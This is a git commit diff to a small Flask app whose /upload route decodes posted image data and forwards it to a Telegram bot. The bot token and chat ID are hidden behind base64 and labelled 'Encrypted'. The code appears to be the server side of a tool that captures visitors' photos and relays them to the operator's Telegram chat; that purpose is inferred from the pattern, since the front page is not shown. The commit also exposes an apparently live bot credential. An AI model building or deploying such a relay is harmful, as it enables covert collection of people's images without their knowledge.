386e6b5314af5550408c72462c39f436519b54ae
Rayhan Khan <rayhankhan4u@gmail.com>
2025-07-23 20:50:12 +0600

    Update main.py

--- main.py
+++ main.py
@@ -5,6 +5,7 @@ import os
 
 app = Flask(__name__)
 
+# Encrypted token and chat_id
 ENCODED_BOT = b'NzkxMjg5NDI4NzpBQUh1V1Y2dmo0WlNBWUd3UEgyVU5NU0wwWG1LendyM0pTWA=='
 ENCODED_CHAT = b'NzE2NzM2MTEyNg=='
 
@@ -17,20 +18,21 @@ def home():
 
 @app.route('/upload', methods=['POST'])
 def upload():
-    data_url = request.form['image']
-    header, encoded = data_url.split(",", 1)
-    image_data = base64.b64decode(encoded)
+    try:
+        data_url = request.form['image']
+        header, encoded = data_url.split(",", 1)
+        image_data = base64.b64decode(encoded)
 
-    files = {'photo': ('photo.jpg', image_data, 'image/jpeg')}
-    data = {'chat_id': decrypt(ENCODED_CHAT)}
+        files = {'photo': ('photo.jpg', image_data, 'image/jpeg')}
+        data = {'chat_id': decrypt(ENCODED_CHAT)}
 
-    token = decrypt(ENCODED_BOT)
-    url = f"https://api.telegram.org/bot{token}/sendPhoto"
-    response = requests.post(url, data=data, files=files)
+        token = decrypt(ENCODED_BOT)
+        url = f"https://api.telegram.org/bot{token}/sendPhoto"
+        response = requests.post(url, data=data, files=files)
 
-    return ('success', 200) if response.ok else ('fail', 500)
-
+        return ('success', 200) if response.ok else ('fail', 500)
+    except Exception as e:
+        return (str(e), 500)
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run()
